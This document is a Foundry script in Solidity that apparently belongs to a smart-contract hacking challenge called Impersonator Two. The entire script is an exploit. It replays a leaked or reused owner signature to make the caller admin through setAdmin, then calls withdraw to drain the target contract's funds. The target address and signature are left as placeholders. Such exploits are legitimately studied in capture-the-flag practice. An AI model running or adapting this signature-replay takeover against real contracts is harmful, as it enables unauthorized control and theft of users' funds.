// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IImpersonatorTwo {
    function setAdmin(bytes memory signature, address newAdmin) external;
    function withdraw() external;
}

contract ImpersonatorTwoExploit is Script {

    function run() external {
        address target = 0xTARGET;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        IImpersonatorTwo imp = IImpersonatorTwo(target);

        // Replace with leaked / reused signature
        bytes memory sig = hex"OWNER_SIGNATURE";

        // 1. Become admin
        imp.setAdmin(sig, msg.sender);

        // 2. Withdraw funds
        imp.withdraw();

        vm.stopBroadcast();
    }
}